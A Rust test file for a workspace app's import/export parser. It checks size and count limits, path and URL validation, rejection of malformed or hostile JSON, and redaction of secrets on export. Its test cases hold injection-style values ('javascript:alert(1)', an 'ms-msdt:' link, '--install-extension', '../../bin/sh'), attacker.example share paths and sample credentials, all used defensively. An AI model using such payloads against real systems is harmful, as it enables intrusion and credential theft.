    first_app(&mut value)["futureOption"] = json!([1, 2]);
    first_app(&mut value)["state"]["windows"][0]["tabs"][0]["favicon"] = json!("x");
    assert_eq!(parse_export(&to_bytes(&value)).unwrap(), export);

    let mut with_bom = "\u{feff}".as_bytes().to_vec();
    with_bom.extend(to_bytes(&original));
    assert_eq!(parse_export(&with_bom).unwrap(), export);

    // Third-party adapter data is accepted.
    let mut value = base();
    first_app(&mut value)["state"] =
        json!({ "kind": "custom", "data": { "layout": [1, { "a": null }] } });
    assert!(parse_export(&to_bytes(&value)).is_ok());
}

#[test]
fn parse_rejects_broken_files() {
    let mut oversized = to_bytes(&base());
    oversized.resize(MAX_IMPORT_BYTES + 1, b' ');
    assert_eq!(rejection(&oversized), "the file is larger than 5 MB");

    let message = rejection(b"{\"format\": \"\xff\"}");
    assert!(
        message.contains("not UTF-8") && message.contains("byte 12"),
        "{message}"
    );

    assert_eq!(rejection(b""), "the file is empty");
    assert_eq!(rejection(b" \n\t "), "the file is empty");

    let malformed = "{\n  \"format\": \"reframe.workspace\",\n  \"version\": 1,,\n}";
    let message = rejection(malformed.as_bytes());
    assert!(
        message.starts_with("the JSON is malformed at line 3, column 16"),
        "{message}"
    );

    let message = rejection(b"{\"format\": \"reframe.workspace\"");
    assert!(
        message.starts_with("the file ends unexpectedly at line 1"),
        "{message}"
    );

    assert_eq!(
        rejection(b"[1, 2]"),
        "the file does not contain a JSON object"
    );
}

#[test]
fn parse_rejects_wrong_format_and_versions() {
    let mut value = base();
    value["format"] = json!("other.app");
    assert_rejected(
        &value,
        "its format is \"other.app\" instead of \"reframe.workspace\"",
    );

    let mut value = base();
    value.as_object_mut().unwrap().remove("format");
    assert_rejected(&value, "no \"format\" field");

    let mut value = base();
    value["format"] = json!(7);
    assert_rejected(&value, "\"format\" field is not text");

    let mut value = base();
    value["version"] = json!(2);
    assert_rejected(&value, "created by a newer version of Reframe");

    let mut value = base();
    value["version"] = json!(0);
    assert_rejected(&value, "format version 0 is not valid");

    for version in [json!(-1), json!(1.5), json!("1")] {
        let mut value = base();
        value["version"] = version;
        assert_rejected(&value, "not a positive whole number");
    }

    let mut value = base();
    value.as_object_mut().unwrap().remove("version");
    assert_rejected(&value, "no \"version\" field");
}

#[test]
fn parse_rejects_structural_errors_with_positions() {
    let mut value = base();
    first_app(&mut value)["enabled"] = json!("yes");
    let message = rejection(&to_bytes(&value));
    assert!(
        message.starts_with("unexpected content at line"),
        "{message}"
    );
    assert!(message.contains("invalid type"), "{message}");

    let mut value = base();
    first_app(&mut value)["state"] = json!({ "kind": "hologram" });
    assert_rejected(&value, "newer version of Reframe");

    let mut value = base();
    value["exportedAt"] = json!("yesterday");
    assert_rejected(&value, "unexpected content at line");

    let mut value = base();
    value["workspace"].as_object_mut().unwrap().remove("name");
    assert_rejected(&value, "missing field `name`");
}

#[test]
fn parse_rejects_nul_characters_anywhere() {
    let mut value = base();
    first_app(&mut value)["displayName"] = json!("Bro\u{0}wser");
    assert_rejected(
        &value,
        "it contains a NUL character in workspace.applications[0].displayName",
    );
    let mut value = base();
    value["machine"]["applications"][1]["workingDirectory"] = json!("/home/\u{0}a");
    assert_rejected(&value, "machine.applications[1].workingDirectory");
}

#[test]
fn parse_enforces_counts() {
    let mut value = base();
    let template = value["workspace"]["applications"][0].clone();
    let apps: Vec<Value> = (0..101)
        .map(|_| {
            let mut app = template.clone();
            app["id"] = json!(Uuid::new_v4());
            app["dependsOn"] = json!([]);
            app
        })
        .collect();
    value["workspace"]["applications"] = json!(apps);
    value["machine"]["applications"] = json!([]);
    assert_rejected(&value, "101 applications (at most 100 are allowed)");

    let mut value = base();
    let saved = first_app(&mut value)["windows"][0].clone();
    first_app(&mut value)["windows"] = json!(vec![saved; 51]);
    assert_rejected(&value, "51 saved windows (at most 50 are allowed)");

    let mut value = base();
    let one_tab = first_app(&mut value)["state"]["windows"][0]["tabs"][0].clone();
    first_app(&mut value)["state"]["windows"][0]["tabs"] = json!(vec![one_tab; 501]);
    assert_rejected(&value, "501 tabs (at most 500 are allowed)");

    let mut value = base();
    let browser_window = first_app(&mut value)["state"]["windows"][0].clone();
    first_app(&mut value)["state"]["windows"] = json!(vec![browser_window; 51]);
    assert_rejected(&value, "51 browser windows (at most 50 are allowed)");

    let mut value = base();
    first_app(&mut value)["arguments"] = json!(vec!["--x"; 33]);
    assert_rejected(&value, "33 launch arguments (at most 32 are allowed)");

    let mut value = base();
    let monitor = value["machine"]["monitors"][0].clone();
    value["machine"]["monitors"] = json!(vec![monitor; 33]);
    assert_rejected(&value, "33 monitors (at most 32 are allowed)");
}

#[test]
fn parse_enforces_references() {
    let mut value = base();
    let first_id = first_app(&mut value)["id"].clone();
    value["workspace"]["applications"][1]["id"] = first_id;
    assert_rejected(&value, "two applications share the id");

    let mut value = base();
    value["workspace"]["applications"][1]["dependsOn"] = json!([Uuid::new_v4()]);
    assert_rejected(&value, "depends on an application that is not in the file");

    let mut value = base();
    let own_id = value["workspace"]["applications"][1]["id"].clone();
    value["workspace"]["applications"][1]["dependsOn"] = json!([own_id]);
    assert_rejected(&value, "application #2 (\"Terminal\") depends on itself");

    let mut value = base();
    value["machine"]["applications"][0]["entryId"] = json!(Uuid::new_v4());
    assert_rejected(
        &value,
        "refers to an application that is not in the workspace",
    );

    let mut value = base();
    let entry = value["machine"]["applications"][0].clone();
    value["machine"]["applications"][1] = entry;
    assert_rejected(&value, "lists application");
}

#[test]
fn parse_enforces_field_rules() {
    let cases: Vec<(Mutation, &str)> = vec![
        (
            |v| first_app(v)["windows"][0]["bounds"]["width"] = json!(-5),
            "invalid size -5×800",
        ),
        (
            |v| first_app(v)["windows"][0]["bounds"]["height"] = json!(100_000),
            "invalid size",
        ),
        (
            |v| first_app(v)["windows"][0]["bounds"]["x"] = json!(2_000_000_000),
            "out-of-range position",
        ),
        (
            |v| v["workspace"]["restore"]["timeoutMs"] = json!(10),
            "the restore settings are invalid: Timeout must be between 1 and 300 seconds.",
        ),
        (
            |v| v["workspace"]["restore"]["maxParallel"] = json!(0),
            "Parallel launches",
        ),
        (
            |v| first_app(v)["options"]["retryCount"] = json!(9),
            "more than 5 retries",
        ),
        (
            |v| {
                first_app(v)["state"]["windows"][0]["tabs"][0]["url"] = json!("javascript:alert(1)")
            },
            "is not an http, https, file or ftp URL",
        ),
        (
            |v| {
                first_app(v)["state"]["windows"][0]["tabs"][0]["url"] =
                    json!(format!("https://example.com/{}", "a".repeat(4100)));
            },
            "longer than 4096 characters",
        ),
        (
            |v| first_app(v)["state"]["windows"][0]["tabs"][0]["title"] = json!("t".repeat(1025)),
            "longer than 1024 characters",
        ),
        (
            |v| first_app(v)["state"]["windows"][0]["activeTab"] = json!(5),
            "the active tab of browser window 1",
        ),
        (
            |v| {
                first_app(v)["state"] =
                    json!({ "kind": "media", "uri": "ms-msdt:/id x", "label": null })
            },
            "media link of application #1 (\"Browser\") is not an allowed link",
        ),
        (
            |v| {
                first_app(v)["state"] = json!({
                    "kind": "documents",
                    "documents": [{ "path": "/a.pdf", "page": 0 }]
                });
            },
            "page 0",
        ),
        (
            |v| {
                v["workspace"]["applications"][1]["state"]["sessions"][0]["workingDirectory"] =
                    json!(format!("/{}", "d".repeat(4100)));
            },
            "longer than 4096 characters",
        ),
        (
            |v| {
                v["workspace"]["applications"][1]["state"]["sessions"][0]["startupCommand"] =
                    json!("x".repeat(4097));
            },
            "startup command",
        ),
        (
            |v| first_app(v)["arguments"][0] = json!("a".repeat(1025)),
            "launch argument 1",
        ),
        (
            |v| first_app(v)["displayName"] = json!("   "),
            "has no name",
        ),
        (
            |v| first_app(v)["appId"] = json!(""),
            "has no application id",
        ),
        (
            |v| v["workspace"]["name"] = json!("   "),
            "the workspace name is empty",
        ),
        (
            |v| v["workspace"]["name"] = json!("n".repeat(81)),
            "the workspace name is longer than 80 characters",
        ),
        (
            |v| v["workspace"]["description"] = json!("d".repeat(501)),
            "the description is longer than 500 characters",
        ),
        (
            |v| v["workspace"]["icon"] = json!("🧪".repeat(17)),
            "the icon is longer than 16 characters",
        ),
        (|v| v["workspace"]["color"] = json!("red"), "#RRGGBB"),
        (
            |v| v["machine"]["monitors"][0]["scaleFactor"] = json!(0.0),
            "invalid scale factor",
        ),
        (
            |v| {
                v["machine"]["applications"][0]["package"] =
                    json!({ "kind": "flatpak", "id": " ", "path": null })
            },
            "has no id",
        ),
        (
            |v| v["machine"]["applications"][0]["executable"] = json!(""),
            "is empty",
        ),
    ];
    for (mutate, needle) in cases {
        let mut value = base();
        mutate(&mut value);
        assert_rejected(&value, needle);
    }
}

#[test]
fn parse_rejects_relative_paths_and_odd_ids() {
    let cases: Vec<(Mutation, &str)> = vec![
        (
            |v| {
                first_app(v)["state"] = json!({
                    "kind": "documents",
                    "documents": [{ "path": "--install-extension", "page": null }]
                });
            },
            "is not an absolute path (\"--install-extension\")",
        ),
        (
            |v| {
                first_app(v)["state"] = json!({
                    "kind": "projects",
                    "projects": [{ "path": "code/app", "isWorkspaceFile": false, "windowTitle": null }]
                });
            },
            "is not an absolute path",
        ),
        (
            |v| v["machine"]["applications"][1]["workingDirectory"] = json!("~/code"),
            "is not an absolute path",
        ),
        (
            |v| v["machine"]["applications"][0]["executable"] = json!("C:bin\\x.exe"),
            "is not an absolute path",
        ),
        (
            |v| first_app(v)["appId"] = json!("exe:../../bin/sh"),
            "contains a path separator or a control character",
        ),
        (
            |v| first_app(v)["adapterId"] = json!("generic\u{1b}[2J"),
            "contains a path separator or a control character",
        ),
    ];
    for (mutate, needle) in cases {
        let mut value = base();
        mutate(&mut value);
        assert_rejected(&value, needle);
    }
    // Absolute paths of every OS are accepted.
    let mut value = base();
    first_app(&mut value)["state"] = json!({
        "kind": "folders",
        "folders": [
            { "path": "C:\\Users\\a", "windowTitle": null },
            { "path": "d:/data", "windowTitle": null },
            { "path": "\\\\nas\\share", "windowTitle": null },
            { "path": "/Users/a", "windowTitle": null }
        ]
    });
    assert!(parse_export(&to_bytes(&value)).is_ok());
}

#[test]
fn parse_survives_hostile_json() {
    // Deep nesting, inside adapter data or anywhere else.
    let mut value = base();
    first_app(&mut value)["state"] = json!({ "kind": "custom", "data": "DEEP" });
    let text = String::from_utf8(to_bytes(&value)).unwrap();
    let deep = text.replace(
        "\"DEEP\"",
        &format!("{}{}", "[".repeat(100), "]".repeat(100)),
    );
    assert!(rejection(deep.as_bytes()).contains("nested more than 64 levels deep at line"));
    let very_deep = format!("{}{}", "[".repeat(1_000_000), "]".repeat(1_000_000));
    assert_eq!(
        rejection(very_deep.as_bytes()),
        "the file does not contain a JSON object"
    );
    let deep_object = format!(
        "{{\"format\":\"reframe.workspace\",\"version\":1,\"a\":{}{}}}",
        "[".repeat(200_000),
        "]".repeat(200_000)
    );
    assert!(rejection(deep_object.as_bytes()).contains("nested more than 64 levels deep"));
    let deep_format = format!(
        "{{\"format\":{}{}}}",
        "[".repeat(200_000),
        "]".repeat(200_000)
    );
    assert!(rejection(deep_format.as_bytes()).contains("is not text"));

    // Huge lists, even in fields Reframe does not know, are refused before deserializing.
    let mut text = String::from_utf8(to_bytes(&base())).unwrap();
    text.truncate(text.trim_end().len() - 1);
    text.push_str(",\"future\": [");
    text.push_str(&"0,".repeat(200_000));
    text.push_str("0]}");
    assert!(rejection(text.as_bytes()).contains("a list with more than 10000 entries"));

    // NUL characters anywhere, including unknown fields and keys.
    let mut value = base();
    value["future"] = json!({ "x": ["ok", "n\u{0}l"] });
    assert_rejected(&value, "NUL character in future.x[1]");
    let mut value = base();
    value["machine"]["k\u{0}"] = json!(1);
    assert_rejected(&value, "NUL character in machine.k\\u0000");

    // Wrong types, out-of-range numbers, duplicates, broken escapes, trailing garbage.
    let wrong: Vec<(Mutation, &str)> = vec![
        (
            |v| first_app(v)["windows"] = json!({ "a": 1 }),
            "invalid type: map",
        ),
        (
            |v| first_app(v)["displayName"] = json!(42),
            "invalid type: integer",
        ),
        (
            |v| first_app(v)["windows"][0]["bounds"]["width"] = json!(1e300),
            "invalid type: floating point",
        ),
        (
            |v| first_app(v)["windows"][0]["bounds"]["x"] = json!(4_294_967_296_u64),
            "invalid value: integer",
        ),
        (
            |v| first_app(v)["id"] = json!("not-a-uuid"),
            "unexpected content",
        ),
        (|v| v["machine"]["os"] = json!("plan9"), "unknown variant"),
        (
            |v| v["version"] = json!(1e300),
            "not a positive whole number",
        ),
        (
            |v| v["version"] = json!(18_446_744_073_709_551_615_u64),
            "newer version",
        ),
        (
            |v| v["format"] = json!(["reframe.workspace"]),
            "is not text",
        ),
        (|v| v["format"] = json!(null), "no \"format\" field"),
    ];
    for (mutate, needle) in wrong {
        let mut value = base();
        mutate(&mut value);
        assert_rejected(&value, needle);
    }
    let text = String::from_utf8(to_bytes(&base())).unwrap();
    let duplicated = text.replacen("\"version\": 1,", "\"version\": 1, \"version\": 1,", 1);
    assert!(rejection(duplicated.as_bytes()).contains("duplicate field `version`"));
    let surrogate = text.replacen("\"Small\"", "\"\\ud800\"", 1);
    let message = rejection(surrogate.as_bytes());
    assert!(
        message.starts_with("unexpected content at line") && message.contains("hex escape"),
        "{message}"
    );
    let trailing = format!("{text} {{}}");
    assert!(rejection(trailing.as_bytes()).contains("trailing characters"));
    let raw_control = text.replacen("\"Small\"", "\"Sm\u{1}all\"", 1);
    assert!(rejection(raw_control.as_bytes()).contains("control character"));
}

#[test]
fn rejection_messages_summarize_many_problems() {
    let mut value = base();
    value["workspace"]["name"] = json!("");
    value["workspace"]["color"] = json!("blue");
    value["workspace"]["restore"]["retryCount"] = json!(10);
    first_app(&mut value)["windows"][0]["bounds"]["width"] = json!(0);
    let message = rejection(&to_bytes(&value));
    assert!(message.ends_with("(and 1 more problem)"), "{message}");
}

#[cfg(unix)]
#[test]
fn network_locations_are_reported_and_never_accessed() {
    let mut ws = Workspace::new("Shares", "🗄️");
    let mut viewer = ApplicationEntry::new("exe:viewer", "Viewer", "generic");
    viewer.launch.executable = Some("//fileserver/apps/viewer".into());
    viewer.launch.working_directory = Some("//fileserver/team".into());
    viewer.state = AppState::Documents {
        documents: vec![
            DocumentRef {
                path: r"\\attacker.example\share\doc.pdf".into(),
                page: None,
            },
            DocumentRef {
                path: "/net/attacker.example/export/notes.txt".into(),
                page: None,
            },
            DocumentRef {
                path: "/nonexistent/local.pdf".into(),
                page: None,
            },
        ],
    };
    let mut browser = ApplicationEntry::new("exe:browser", "Browser", "chromium");
    browser.state = AppState::Browser {
        windows: vec![BrowserWindow {
            tabs: vec![
                tab("file://attacker.example/share/x.html"),
                tab("https://example.com/"),
            ],
            active_tab: None,
            window_title: None,
        }],
        profile: None,
    };
    ws.applications = vec![viewer, browser];
    let adapters = adapters();
    let export = export_workspace(&ws, &adapters, OsKind::current(), "test").unwrap();
    let platform = MockPlatform::new();
    let preview = preview_import(&export, "x.json", &platform, &adapters).unwrap();
    // Only the local path is reported missing; network ones were not checked.
    assert_eq!(
        preview.applications[0].missing_paths,
        vec![PathBuf::from("/nonexistent/local.pdf")]
    );
    // The exported executable on a share is never used as is, even from the same OS.
    assert_eq!(
        preview.applications[0].resolution,
        AppResolution::Unresolved
    );
    assert!(
        preview.warnings.iter().any(|w| w
            == "5 paths or links point to other computers (such as \\\\server\\share) — \
                Reframe did not access them; restore this workspace only if you trust where the \
                file came from"),
        "{:?}",
        preview.warnings
    );
    // A working directory on a share is kept, unverified.
    let imported =
        build_imported_workspace(&export, &resolution(None), &platform, &adapters).unwrap();
    assert_eq!(
        imported.applications[0].launch.working_directory,
        Some(PathBuf::from("//fileserver/team"))
    );
    assert_eq!(imported.applications[0].launch.executable, None);
}

/// An adapter whose own sanitizing forgets everything.
struct LeakyAdapter;

impl AppAdapter for LeakyAdapter {
    fn id(&self) -> &'static str {
        "leaky"
    }

    fn name(&self) -> &'static str {
        "Leaky"
    }

    fn identify(&self, _process: &ProcessInfo, _windows: &[&WindowInfo]) -> Option<AppIdentity> {
        None
    }

    fn capability(&self, info: &PlatformInfo) -> AdapterCapability {
        GenericAdapter::new().capability(info)
    }

    fn capture(&self, ctx: &CaptureContext<'_>, input: &CaptureInput<'_>) -> CaptureOutput {
        GenericAdapter::new().capture(ctx, input)
    }

    fn launch_plan(
        &self,
        ctx: &LaunchContext<'_>,
        entry: &ApplicationEntry,
    ) -> Result<Vec<LaunchStep>, String> {
        GenericAdapter::new().launch_plan(ctx, entry)
    }

    fn describe(&self, _state: &AppState) -> Vec<StateDetail> {
        Vec::new()
    }

    fn locate_query(&self, _app_id: &str) -> LocateQuery {
        LocateQuery::default()
    }

    fn sanitize_for_export(&self, state: &AppState) -> AppState {
        state.clone()
    }
}

#[test]
fn export_applies_the_baseline_after_adapter_sanitizing() {
    let adapters = AdapterRegistry::with_adapters(vec![Arc::new(LeakyAdapter)]);
    let mut ws = Workspace::new("Leaky", "💧");
    let mut browser = ApplicationEntry::new("exe:b", "Browser", "leaky");
    browser.state = AppState::Browser {
        windows: vec![BrowserWindow {
            tabs: vec![tab("https://example.com/cb?access_token=abc&q=1")],
            active_tab: Some(0),
            window_title: None,
        }],
        profile: None,
    };
    let mut terminal = ApplicationEntry::new("exe:t", "Terminal", "leaky");
    terminal.state = AppState::Terminal {
        sessions: vec![session(
            None,
            Some(&format!("export GITHUB_TOKEN={GITHUB_TOKEN}")),
            true,
        )],
    };
    terminal.windows = vec![window("mysql -u root -phunter2 - Terminal", 0)];
    let mut custom = ApplicationEntry::new("exe:c", "Custom", "leaky");
    custom.state = AppState::Custom {
        data: json!({ "layout": "grid" }),
    };
    ws.applications = vec![browser, terminal, custom];
    let export = export_workspace(&ws, &adapters, OsKind::Linux, "test").unwrap();
    let json = serde_json::to_string(&export).unwrap();
    for secret in ["access_token", GITHUB_TOKEN, "hunter2"] {
        assert!(!json.contains(secret), "{secret} leaked: {json}");
    }
    let AppState::Terminal { sessions } = &export.workspace.applications[1].state else {
        panic!("terminal state expected");
    };
    assert!(!sessions[0].startup_command_approved);
    assert_eq!(
        export.workspace.applications[1].windows[0].title,
        "mysql -u root -p\"<redacted>\" - Terminal"
    );
    // Custom data is the adapter's responsibility (only it knows what the data means).
    assert_eq!(
        export.workspace.applications[2].state,
        AppState::Custom {
            data: json!({ "layout": "grid" })
        }
    );
}

// ----------------------------------------------------------------------------- end to end

#[test]
fn service_export_preview_commit() {
    let fx = Fixture::new();
    let svc = ReframeService::with_adapters(
        Arc::new(MockPlatform::new()),
        Arc::new(adapters()),
        Database::open_in_memory().unwrap(),
        "9.9.9",
    );
    let created = svc
        .create_workspace(NewWorkspace {
            name: "Deep Work".into(),
            description: String::new(),
            icon: "🧠".into(),
            color: None,
        })
        .unwrap();
    let mut ws = sample_workspace(&fx);
    ws.id = created.id;
    ws.name = "Deep Work".into();
    let ws = svc.update_workspace(ws).unwrap();

    let file = fx.path("deep-work.reframe.json");
    svc.export_workspace(ws.id, &file).unwrap();
    let written = std::fs::read_to_string(&file).unwrap();
    assert!(!written.contains(GITHUB_TOKEN));
    assert!(written.contains("\"appVersion\": \"9.9.9\""));

    let preview = svc.preview_import(&file).unwrap();
    assert_eq!(preview.applications.len(), ws.applications.len());
    let mut decisions = resolution(Some("Deep Work (imported)"));
    decisions.file_path = file.display().to_string();
    let imported = svc.commit_import(decisions).unwrap();
    assert_eq!(imported.name, "Deep Work (imported)");
    assert_eq!(svc.get_workspace(imported.id).unwrap(), imported);
    assert_eq!(svc.list_workspaces().unwrap().len(), 2);
    let kinds: Vec<ActivityKind> = svc
        .activity(10)
        .unwrap()
        .into_iter()
        .map(|a| a.kind)
        .collect();
    assert_eq!(kinds[0], ActivityKind::Imported);
    assert_eq!(kinds[1], ActivityKind::Exported);

    // A broken file is reported as an invalid import.
    let broken = fx.path("broken.json");
    std::fs::write(&broken, "{ not json").unwrap();
    assert!(matches!(
        svc.preview_import(&broken),
        Err(CoreError::InvalidImport(_))
    ));
}

#[test]
fn files_written_by_hand_without_machine_entries_still_import() {
    let mut value = base();
    value["machine"]["applications"] = json!([]);
    value["machine"]["monitors"] = json!([]);
    let export = parse_export(&to_bytes(&value)).unwrap();
    let platform = MockPlatform::new();
    let adapters = adapters();
    let preview = preview_import(&export, "x.json", &platform, &adapters).unwrap();
    assert!(
        preview
            .applications
            .iter()
            .all(|a| a.resolution == AppResolution::Unresolved)
    );
    let ws = build_imported_workspace(&export, &resolution(None), &platform, &adapters).unwrap();
    assert_eq!(ws.applications.len(), 2);
    assert!(ws.monitors.is_empty());
    assert!(
        ws.applications
            .iter()
            .all(|a| a.launch.executable.is_none() && a.launch.working_directory.is_none())
    );
}

// ------------------------------------------------------------------------------ robustness

/// Deterministic generator of hostile strings (no external fuzzing dependency).
struct Garbage(u64);

impl Garbage {
    const PIECES: &'static [&'static str] = &[
        "a",
        "Z",
        "0",
        "9",
        " ",
        "\t",
        "\n",
        "\"",
        "'",
        "\\",
        "$",
        "(",
        ")",
        "{",
        "}",
        "`",
        "=",
        ":",
        "/",
        "?",
        "#",
        "&",
        ";",
        "%",
        "%ZZ",
        "%C3",
        "%00",
        "@",
        "-",
        "--",
        ".",
        "~",
        "é",
        "€",
        "😀",
        "\0",
        "<",
        ">",
        "|",
        "*",
        "[",
        "]",
        ",",
        "+",
        "https://",
        "http://u:p@",
        "file:///",
        "ftp://",
        "javascript:",
        "spotify:",
        "--token",
        "--password",
        "=x",
        "export ",
        "TOKEN=",
        "$env:",
        "C:\\",
        "\\\\?\\",
        "\\\\srv\\share",
        "/home/a",
        "?code=",
        "&state=",
        "#access_token=",
        ";jsessionid=",
        "eyJhbGciOiJIUzI1NiJ9.",
        GITHUB_TOKEN,
        "Bearer ",
        "Authorization:",
        "-u",
        "-p",
        "-P",
        "curl ",
        "mysql ",
        "smbclient ",
        "docker login ",
        "config ",
        "set ",
        "pass:",
        "Password=",
        "ConvertTo-SecureString ",
        "Read-Host",
        "$'",
        "(",
        "%TOKEN%",
        "reset/",
        "webhooks/",
        "8f14e45fceea167a5a36dedd4bea2543",
        "550e8400-e29b-41d4-a716-446655440000",
        "//",
        "/net/",
        "..",
        "\u{202e}",
    ];

    fn next(&mut self) -> u64 {
        // xorshift64*
        self.0 ^= self.0 >> 12;
        self.0 ^= self.0 << 25;
        self.0 ^= self.0 >> 27;
        self.0.wrapping_mul(0x2545_F491_4F6C_DD1D)
    }

    fn pick(&mut self, len: usize) -> usize {
        usize::try_from(self.next() % len as u64).unwrap_or(0)
    }

    fn string(&mut self) -> String {
        let len = self.pick(24);
        (0..len)
            .map(|_| Self::PIECES[self.pick(Self::PIECES.len())])
            .collect()
    }
}

#[test]
fn hostile_input_never_panics_and_sanitizing_is_stable() {
    fuzz(0xD1B5_4A32_D192_ED03, 30_000);
}

/// A longer run over several seeds: `cargo test --release -p reframe-core -- --ignored`.
#[test]
#[ignore = "slow: millions of generated inputs"]
fn hostile_input_extended() {
    for seed in [
        0x9E37_79B9_7F4A_7C15,
        0xBF58_476D_1CE4_E5B9,
        0x94D0_49BB_1331_11EB,
    ] {
        fuzz(seed, 1_000_000);
    }
}

fn fuzz(seed: u64, iterations: usize) {
    use super::command::redact_command;
    use super::paths::{PortablePath, looks_like_absolute_path};
    use super::sanitize::{
        clean_terminal_title, clean_title, sanitize_arguments, sanitize_media_uri, sanitize_state,
        sanitize_url,
    };
    use super::secrets::{NameKind, is_secret_name, looks_like_credential};

    let mut garbage = Garbage(seed);
    for _ in 0..iterations {
        let a = garbage.string();
        let b = garbage.string();
        if let Some(url) = sanitize_url(&a) {
            assert_eq!(sanitize_url(&url).as_deref(), Some(url.as_str()), "{a:?}");
            assert!(url.len() <= super::limits::MAX_URL_LEN);
        }
        if let Some(uri) = sanitize_media_uri(&a) {
            assert_eq!(
                sanitize_media_uri(&uri).as_deref(),
                Some(uri.as_str()),
                "{a:?}"
            );
        }
        let arguments = sanitize_arguments(&[a.clone(), b.clone()]);
        assert_eq!(sanitize_arguments(&arguments), arguments, "{a:?} {b:?}");
        let command = format!("{a} {b}");
        let redacted = redact_command(&command);
        assert_eq!(redact_command(&redacted), redacted, "{command:?}");
        let _ = clean_title(&a, 16);
        let _ = clean_terminal_title(&a, 16);
        let _ = PortablePath::parse(&a).render();
        let _ = looks_like_absolute_path(&a);
        let _ = looks_like_credential(&a);
        let _ = is_secret_name(&a, NameKind::Flag);
        let _ = parse_export(a.as_bytes());
        let state = AppState::Terminal {
            sessions: vec![session(Some(PathBuf::from(&a)), Some(&b), true)],
        };
        let AppState::Terminal { sessions } = sanitize_state(&state) else {
            panic!("terminal state expected");
        };
        assert!(!sessions[0].startup_command_approved);
    }
}
